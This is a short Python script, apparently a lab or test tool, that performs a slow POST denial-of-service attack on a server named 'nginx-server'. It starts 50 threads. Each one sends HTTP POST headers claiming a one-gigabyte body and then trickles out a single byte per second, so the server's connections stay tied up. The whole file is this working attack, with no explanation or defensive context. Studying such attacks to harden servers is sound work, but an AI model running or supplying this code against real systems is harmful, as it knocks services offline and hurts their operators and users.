
import socket
import time
import threading

host = "nginx-server"
port = 80
content_length = 1000000000
num_threads = 50

def slow_post():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        headers = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {content_length}\r\n\r\n"
        sock.send(headers.encode())
        while True:
            sock.send(b"A")
            time.sleep(1)
    except Exception as e:
        print("Connection dropped:", e)

for _ in range(num_threads):
    threading.Thread(target=slow_post, daemon=True).start()

print(f"[+] Started {num_threads} slow POST threads.")
while True:
    time.sleep(10)
